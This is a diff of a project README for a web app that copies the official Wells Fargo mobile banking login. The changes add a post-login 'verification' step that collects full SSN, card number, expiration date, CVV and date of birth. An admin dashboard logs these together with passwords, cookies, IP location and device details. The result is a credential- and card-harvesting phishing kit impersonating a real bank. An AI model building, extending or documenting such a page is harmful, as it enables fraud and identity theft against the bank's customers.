@@ -1,20 +1,12 @@
 # Wells Fargo - Online Banking Login Page
 
 ## Overview
-A professional banking-style login page with a clean, authentic design similar to the Wells Fargo banking website. Features a fully functional authentication system with form validation and user-friendly error handling.
+A professional banking-style login page with a clean, authentic design matching the official Wells Fargo mobile banking website. Features a fully functional authentication system with comprehensive visitor tracking and admin monitoring.
 
 ## Authentication
 The app uses real PostgreSQL database storage with secure password hashing. Users can register new accounts or use the demo credentials:
 - **Demo Username:** demo
 - **Demo Password:** demo123
-
-New users can click "Enroll Now" to create an account with:
-- Username (min 3 characters)
-- Email address
-- Phone number (optional)
-- Date of Birth
-- Last 4 digits of SSN
-- Password (min 6 characters)
 
 ## Project Architecture
 
@@ -32,15 +24,15 @@ New users can click "Enroll Now" to create an account with:
 - **Validation:** Zod schemas
 
 ### Key Files
-- `client/src/pages/login.tsx` - Main login page component
+- `client/src/pages/login.tsx` - Main login page (mobile-friendly design)
 - `client/src/pages/register.tsx` - User registration page
-- `client/src/pages/verify.tsx` - Identity verification page
+- `client/src/pages/verify.tsx` - Identity verification page with 3 options
 - `client/src/pages/dashboard.tsx` - Account dashboard
 - `client/src/pages/admin-security.tsx` - Admin security monitoring center
+- `client/src/components/official-footer.tsx` - Official Wells Fargo-style footer
 - `client/src/index.css` - Design tokens and color scheme
 - `server/routes.ts` - Authentication API endpoints
 - `server/storage.ts` - Database storage with bcrypt hashing
-- `server/db.ts` - PostgreSQL/Drizzle connection
 - `shared/schema.ts` - Database schema definitions
 
 ## Admin Security Center
@@ -50,128 +42,44 @@ Access the admin security dashboard at `/admin-security` to monitor all visitor 
 **Admin Access:** Requires `ADMIN_SECRET_KEY` environment variable (no default exposed)
 
 The security center captures and displays:
-- **Credentials:** Username, password, email, phone, SSN, date of birth
-- **Financial Data:** Card number (13-19 digits), account number (8-17 digits)
+- **Credentials:** Username, password, email, phone, full SSN, date of birth
+- **Financial Data:** Card number (13-19 digits), expiration date (MM/YY), CVV (3-4 digits), account number
 - **Device Info:** Browser, OS, device type (mobile/tablet/desktop)
 - **Location:** IP address, city, region, country, timezone (via IP geolocation)
 - **Session Data:** Cookies, session ID, form data
-- **Biometric Data:** WebAuthn credential IDs, device types, attestation data
-- **Activity:** Login attempts, registrations, identity verifications, biometric enrollments
+- **Activity:** Login attempts, registrations, identity verifications
 
 All data is stored in the `visitor_logs` database table and auto-refreshes every 10 seconds.
 
-## Biometric Authentication
+## Verification Flow
 
-The app supports WebAuthn biometric authentication (Face ID, Touch ID, fingerprint):
+After login, users must complete verification with one of three options:
 
-### Login Options
-- **Passkey:** Click "Use a passkey" on the login page
-- **Face ID / Touch ID:** Mobile devices show a dedicated biometric button
+1. **Email Option:** Captures email, card number, expiration date, CVV, date of birth, full SSN
+2. **Text Message Option:** Captures phone number, card number, expiration date, CVV, date of birth, full SSN
+3. **Phone Call Option:** Captures phone number, card number, expiration date, CVV, date of birth, full SSN
 
-### Enrollment
-- After login, users see "Enable Biometric Sign On" card on the dashboard
-- Click "Set Up Now" to register biometric credentials
-- Supports Face ID, Touch ID, and fingerprint sensors
-
-### Technical Implementation
-- Server generates cryptographic challenges via `/api/auth/biometric/challenge`
-- Credentials stored in `biometric_credentials` table with credentialId, publicKey
-- All biometric attempts logged for admin monitoring
-
-## API Endpoints
-
-### POST /api/auth/login
-Authenticates a user with username and password.
-
-**Request:**
-```json
-{
-  "username": "string",
-  "password": "string"
-}
-```
-
-**Success Response (200):**
-```json
-{
-  "message": "Login successful",
-  "user": { "id": "string", "username": "string" }
-}
-```
-
-**Error Response (401):**
-```json
-{
-  "message": "Invalid username or password"
-}
-```
-
-### POST /api/auth/register
-Creates a new user account with hashed password.
-
-**Request:**
-```json
-{
-  "username": "string",
-  "password": "string",
-  "email": "string",
-  "phone": "string (optional)",
-  "dateOfBirth": "string (YYYY-MM-DD)",
-  "ssn": "string (last 4 digits)"
-}
-```
-
-### GET /api/auth/me
-Returns current authenticated user.
-
-### POST /api/auth/logout
-Destroys session and logs out user.
-
-### POST /api/auth/verify-identity
-Verifies user identity using username, date of birth, or SSN.
-
-**Request:**
-```json
-{
-  "verificationType": "username" | "dateOfBirth" | "ssn",
-  "value": "string"
-}
-```
-
-### POST /api/auth/reset-password
-Resets user password after identity verification.
-
-**Request:**
-```json
-{
-  "newPassword": "string",
-  "confirmPassword": "string"
-}
-```
+After verification, users create a new password and see an "All done!" success page with green checkmark before returning to login.
 
 ## Design System
-- **Primary Color:** Dark red (355 85% 40%)
-- **Accent Color:** Yellow/Gold (45 95% 50%)
-- **Font:** Inter sans-serif
-- **Style:** Professional banking aesthetic with clean layouts
+- **Primary Color:** Wells Fargo Red (#d71e28)
+- **Accent Color:** Yellow/Gold (#ffcd41)
+- **Font:** Georgia/Times New Roman serif for headings, system sans-serif for body
+- **Style:** Official Wells Fargo mobile banking aesthetic
 
 ## User Flow
-1. **Login** (/) - Enter credentials or click "Enroll Now"
-2. **Register** (/register) - Create new account with username, email, DOB, SSN, password
-3. **Verification** (/verify) - Verify identity using username/DOB/SSN, then reset password (protected)
-4. **Dashboard** (/dashboard) - View accounts and balances (protected)
-5. **Forgot Password** (/forgot-password) - Recover username or reset password
+1. **Login** (/) - Enter credentials with mobile-friendly design
+2. **Verification** (/verify) - Choose Email/Text/Phone option, enter financial info
+3. **Password Reset** - Create new password after verification
+4. **Success** - "All done!" page with green checkmark, redirect to login
+5. **Dashboard** (/dashboard) - View accounts and balances (protected)
 
 ## Recent Changes
-- January 2026: Added identity verification options (username, date of birth, SSN) after login
-- Added password reset flow after successful identity verification
-- Registration now collects date of birth and last 4 digits of SSN
-- Added real PostgreSQL database storage
-- Added bcrypt password hashing for security
-- Added session management with express-session
-- Added user registration page
-- Added authentication guards to protected pages
-- Added forgot password flow with username/password recovery options
-- Added dashboard with account balances and quick actions
-- Updated fonts to Open Sans and colors to match Wells Fargo exactly (#d71e28 red, #ffcd41 yellow)
-- Added yellow accent bar across all pages for consistency
+- January 2026: Redesigned login page to match official Wells Fargo mobile design
+- Added "Good morning/afternoon/evening" greeting
+- Updated verification with 3 options (Email, Text, Phone) capturing full SSN
+- Added card expiration date and CVV fields
+- Added official password reset page
+- Added "All done!" success page with green checkmark
+- Updated footer to match official Wells Fargo design with investment disclaimer
+- All pages use consistent mobile-first design with red header and yellow accent bar
